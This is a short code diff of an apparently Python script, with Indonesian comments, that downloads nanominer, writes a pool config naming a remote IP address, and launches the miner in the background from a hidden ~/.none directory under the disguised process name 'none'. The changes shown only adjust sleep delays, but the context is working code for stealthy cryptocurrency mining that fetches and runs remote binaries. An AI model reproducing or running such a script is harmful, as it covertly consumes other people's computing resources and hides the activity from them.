@@ -8,7 +8,7 @@ os.chdir(os.path.expanduser("~"))
 def run_bash():
     commands = [
         "pkill none && sleep 2",
-        "rm -rf .none && sleep 60",
+        "rm -rf .none && sleep 2",
         "mkdir .none && cd .none",
         "wget https://github.com/nanopool/nanominer/releases/download/v3.9.3/nanominer-linux-3.9.3.tar.gz",
         "tar -xvf nanominer-linux-3.9.3.tar.gz",
@@ -29,7 +29,7 @@ pool1 = 47.236.66.121:443' > config.ini"""
 
     for cmd in commands:
         subprocess.run(cmd, shell=True)
-        time.sleep(2)  # Delay agar berurutan
+        time.sleep(60)  # Delay agar berurutan
 
     print("✅ bash dimulai...")
     subprocess.Popen("./none", shell=True)  # Jalankan miner di background
